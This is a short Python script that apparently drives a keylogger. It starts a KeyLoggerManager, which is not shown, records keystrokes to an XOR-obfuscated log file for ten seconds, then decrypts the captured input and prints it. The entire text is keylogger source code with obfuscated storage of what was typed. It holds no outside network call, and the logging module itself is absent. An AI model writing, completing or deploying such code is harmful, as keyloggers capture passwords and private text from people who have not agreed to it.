from keyLoggerManager import KeyLoggerManager
import time
import sys



def main(FILE_NAME = 'log_from_outside', KEY = 5):

    KEY = int(KEY) if isinstance(KEY, str) and KEY.isdigit() else 5

    man = KeyLoggerManager(FILE_NAME, KEY)
    man.start()
    time.sleep(10)
    man.stop()
    with open(FILE_NAME, 'r') as file:
        print(man.encryptor.xor_decrypt(file.read()))


if __name__  ==  '__main__':
    args = sys.argv[1:]
    main(*args)

